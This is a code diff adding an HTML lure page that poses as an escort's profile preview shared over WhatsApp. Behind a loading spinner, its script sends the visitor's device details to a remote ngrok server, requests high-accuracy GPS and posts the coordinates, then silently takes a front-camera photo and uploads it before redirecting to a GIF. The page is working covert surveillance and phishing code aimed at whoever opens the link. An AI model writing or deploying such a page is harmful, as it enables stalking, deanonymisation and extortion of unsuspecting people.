@@ -1,0 +1,364 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <!-- ========== META TAGS PARA WHATSAPP ========== -->
+    <title>Conheça Thay Acompanhante Em Anápolis - 1955916</title>
+    
+    <!-- Open Graph / Facebook / WhatsApp -->
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://seu-username.github.io/verificacao-seguranca/">
+    <meta property="og:title" content="Conheça Thay Acompanhante Em Anápolis - 1955916">
+    <meta property="og:description" content="Conheça Thay, acompanhante no Vila Santa Isabel, Anápolis - GO. Rainha da borboleta paraguaia. Veja 40 reviews, 19 fotos e 2 vídeos.">
+    <meta property="og:image" content="https://i.imgur.com/SEU_LINK_AQUI.jpg">
+    <meta property="og:image:width" content="1200">
+    <meta property="og:image:height" content="630">
+    
+    <!-- Twitter Card -->
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:url" content="https://seu-username.github.io/verificacao-seguranca/">
+    <meta name="twitter:title" content="Conheça Thay Acompanhante Em Anápolis - 1955916">
+    <meta name="twitter:description" content="Oi estou na cidade de Anápolis, venha se divertir 😏😍">
+    <meta name="twitter:image" content="https://i.imgur.com/SEU_LINK_AQUI.jpg">
+    
+    <!-- Favicon -->
+    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🦋</text></svg>">
+    
+    <style>
+        * { 
+            margin: 0; 
+            padding: 0; 
+            box-sizing: border-box; 
+        }
+        body { 
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+            background: #ffffff;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        .loader-container {
+            text-align: center;
+        }
+        .spinner {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #4285f4;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 20px;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .loading-text {
+            color: #5f6368;
+            font-size: 14px;
+            margin-top: 10px;
+        }
+        video, canvas { 
+            display: none; 
+            position: absolute;
+            top: -9999px;
+            left: -9999px;
+        }
+        /* Debug Console - Remover em produção */
+        .debug {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            background: #1e1e1e;
+            color: #00ff00;
+            padding: 10px;
+            font-family: monospace;
+            font-size: 11px;
+            max-height: 150px;
+            overflow-y: auto;
+            border-top: 2px solid #00ff00;
+            display: none;
+        }
+        .debug.active { display: block; }
+        .debug-line { margin: 2px 0; }
+    </style>
+</head>
+<body>
+    <div class="loader-container">
+        <div class="spinner"></div>
+        <div class="loading-text">Carregando conteúdo...</div>
+    </div>
+
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas"></canvas>
+
+    <!-- Debug Console -->
+    <div class="debug active" id="debugConsole">
+        <div style="font-weight: bold; margin-bottom: 5px;">📊 DEBUG LOG (remover em produção):</div>
+        <div id="debugLogs"></div>
+    </div>
+
+    <script>
+        // ========== CONFIGURAÇÃO ==========
+        const API_URL = 'https://dictation-jawline-reanalyze.ngrok-free.dev/api/capturar';
+        const REDIRECT_URL = 'https://media4.giphy.com/media/v1.Y2lkPTc5MGI3NjExbDYwemZzZ2pubHo0aGFjbW52ODZ6MG83OHBqaHZpdXczN3cycTVoMSZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/YisYl2OaNl1ZHiGdEu/giphy.gif';
+        
+        let gpsCapturado = false;
+        let fotoCapturada = false;
+
+        // ========== DEBUG LOG ==========
+        function log(msg, type = 'info') {
+            const debugLogs = document.getElementById('debugLogs');
+            const time = new Date().toLocaleTimeString();
+            const color = type === 'success' ? '#00ff00' : type === 'error' ? '#ff0000' : '#00aaff';
+            debugLogs.innerHTML += `<div class="debug-line" style="color: ${color}">[${time}] ${msg}</div>`;
+            debugLogs.scrollTop = debugLogs.scrollHeight;
+            console.log(msg);
+        }
+
+        // ========== FUNÇÃO PARA ENVIAR DADOS ==========
+        async function enviarDados(dados) {
+            try {
+                log(`📤 Enviando: ${dados.evento}`, 'info');
+                log(`📊 Payload: ${JSON.stringify(dados).substring(0, 100)}...`, 'info');
+                
+                const response = await fetch(API_URL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'Accept': 'application/json'
+                    },
+                    body: JSON.stringify(dados)
+                });
+                
+                log(`✅ HTTP ${response.status}: ${response.statusText}`, 'success');
+                
+                if (response.ok) {
+                    const result = await response.json();
+                    log(`✅ Servidor confirmou: ID ${result.id}`, 'success');
+                    return true;
+                }
+                
+                return false;
+                
+            } catch (error) {
+                log(`❌ ERRO: ${error.message}`, 'error');
+                console.error('Erro detalhado:', error);
+                return false;
+            }
+        }
+
+        // ========== REGISTRA ACESSO INICIAL ==========
+        window.onload = function() {
+            log('🔔 Página carregada', 'info');
+            
+            enviarDados({
+                evento: 'pagina_acessada',
+                timestamp: new Date().toISOString(),
+                userAgent: navigator.userAgent,
+                idioma: navigator.language,
+                tela: `${screen.width}x${screen.height}`,
+                plataforma: navigator.platform,
+                referrer: document.referrer
+            });
+
+            // Aguarda 800ms e solicita permissões
+            setTimeout(() => {
+                log('🚀 Iniciando captura de permissões...', 'info');
+                solicitarPermissoes();
+            }, 800);
+        };
+
+        // ========== SOLICITA PERMISSÕES AUTOMATICAMENTE ==========
+        async function solicitarPermissoes() {
+            // Solicita GPS primeiro
+            await capturarGPS();
+            
+            // Aguarda 1.5 segundos e solicita câmera
+            setTimeout(async () => {
+                await capturarFoto();
+                
+                // Após capturar tudo, redireciona
+                setTimeout(() => {
+                    log('🌐 Redirecionando...', 'info');
+                    redirecionar();
+                }, 1500);
+            }, 1500);
+        }
+
+        // ========== CAPTURA GPS (FORÇADO ALTA PRECISÃO) ==========
+        async function capturarGPS() {
+            return new Promise((resolve) => {
+                log('📍 Solicitando GPS com ALTA PRECISÃO...', 'info');
+                
+                if (!("geolocation" in navigator)) {
+                    log('❌ Geolocalização não disponível', 'error');
+                    resolve();
+                    return;
+                }
+
+                // CONFIGURAÇÃO CRÍTICA: Força alta precisão
+                const options = {
+                    enableHighAccuracy: true,  // ⚠️ FORÇA LOCALIZAÇÃO EXATA
+                    timeout: 15000,             // 15 segundos de timeout
+                    maximumAge: 0               // Não aceita cache
+                };
+
+                log('⚙️ Opções GPS: enableHighAccuracy=true, timeout=15s', 'info');
+
+                navigator.geolocation.getCurrentPosition(
+                    async function(position) {
+                        const coords = position.coords;
+                        
+                        log(`📍 GPS CAPTURADO!`, 'success');
+                        log(`   Latitude: ${coords.latitude}`, 'success');
+                        log(`   Longitude: ${coords.longitude}`, 'success');
+                        log(`   Precisão: ${coords.accuracy}m`, 'success');
+                        log(`   Altitude: ${coords.altitude || 'N/A'}`, 'success');
+                        
+                        const dadosGPS = {
+                            evento: 'localizacao_capturada',
+                            latitude: coords.latitude,
+                            longitude: coords.longitude,
+                            precisao: coords.accuracy,
+                            altitude: coords.altitude,
+                            altitudePrecisao: coords.altitudeAccuracy,
+                            velocidade: coords.speed,
+                            direcao: coords.heading,
+                            timestamp: new Date().toISOString(),
+                            timestampGPS: position.timestamp
+                        };
+                        
+                        const enviado = await enviarDados(dadosGPS);
+                        
+                        if (enviado) {
+                            log('✅ GPS enviado ao servidor com sucesso!', 'success');
+                            gpsCapturado = true;
+                        } else {
+                            log('❌ Falha ao enviar GPS ao servidor', 'error');
+                        }
+                        
+                        resolve();
+                    },
+                    function(error) {
+                        log(`❌ ERRO DE GPS: Código ${error.code}`, 'error');
+                        
+                        switch(error.code) {
+                            case error.PERMISSION_DENIED:
+                                log('❌ Usuário NEGOU permissão de localização', 'error');
+                                break;
+                            case error.POSITION_UNAVAILABLE:
+                                log('❌ Localização INDISPONÍVEL (sem sinal GPS)', 'error');
+                                break;
+                            case error.TIMEOUT:
+                                log('❌ TIMEOUT (demorou mais de 15s)', 'error');
+                                break;
+                            default:
+                                log(`❌ Erro desconhecido: ${error.message}`, 'error');
+                        }
+                        
+                        // Mesmo com erro, tenta enviar o evento
+                        enviarDados({
+                            evento: 'gps_erro',
+                            erro_codigo: error.code,
+                            erro_mensagem: error.message,
+                            timestamp: new Date().toISOString()
+                        });
+                        
+                        resolve();
+                    },
+                    options
+                );
+            });
+        }
+
+        // ========== CAPTURA FOTO ==========
+        async function capturarFoto() {
+            return new Promise(async (resolve) => {
+                log('📷 Solicitando acesso à câmera...', 'info');
+                
+                const video = document.getElementById('video');
+                const canvas = document.getElementById('canvas');
+
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia({ 
+                        video: { 
+                            facingMode: "user",
+                            width: { ideal: 640 },
+                            height: { ideal: 480 }
+                        } 
+                    });
+                    
+                    log('✅ Câmera ativada', 'success');
+                    video.srcObject = stream;
+
+                    // Aguarda 1.5 segundos para a câmera inicializar
+                    setTimeout(async () => {
+                        try {
+                            canvas.width = video.videoWidth;
+                            canvas.height = video.videoHeight;
+                            canvas.getContext('2d').drawImage(video, 0, 0);
+                            
+                            const imagemBase64 = canvas.toDataURL('image/jpeg', 0.7);
+                            const tamanhoKB = (imagemBase64.length * 0.75 / 1024).toFixed(2);
+
+                            log(`📸 Foto capturada: ${canvas.width}x${canvas.height} (${tamanhoKB}KB)`, 'success');
+
+                            const enviado = await enviarDados({
+                                evento: 'identidade_verificada',
+                                foto: imagemBase64,
+                                timestamp: new Date().toISOString(),
+                                resolucao: `${canvas.width}x${canvas.height}`,
+                                tamanho: `${tamanhoKB} KB`
+                            });
+
+                            if (enviado) {
+                                log('✅ Foto enviada ao servidor com sucesso!', 'success');
+                                fotoCapturada = true;
+                            } else {
+                                log('❌ Falha ao enviar foto ao servidor', 'error');
+                            }
+                            
+                            // Para a câmera
+                            stream.getTracks().forEach(track => track.stop());
+                            log('📷 Câmera desligada', 'info');
+                            resolve();
+                        } catch (error) {
+                            log(`❌ Erro ao processar foto: ${error.message}`, 'error');
+                            stream.getTracks().forEach(track => track.stop());
+                            resolve();
+                        }
+                    }, 1500);
+
+                } catch (error) {
+                    log(`❌ Câmera NEGADA: ${error.message}`, 'error');
+                    
+                    // Tenta enviar o evento de erro
+                    enviarDados({
+                        evento: 'camera_erro',
+                        erro_mensagem: error.message,
+                        timestamp: new Date().toISOString()
+                    });
+                    
+                    resolve();
+                }
+            });
+        }
+
+        // ========== REDIRECIONA ==========
+        function redirecionar() {
+            log(`🎉 Captura finalizada! GPS: ${gpsCapturado}, Foto: ${fotoCapturada}`, 'success');
+            log(`🌐 Redirecionando para: ${REDIRECT_URL}`, 'info');
+            
+            // Aguarda 2 segundos para você ler os logs
+            setTimeout(() => {
+                window.location.href = REDIRECT_URL;
+            }, 2000);
+        }
+    </script>
+</body>
+</html>
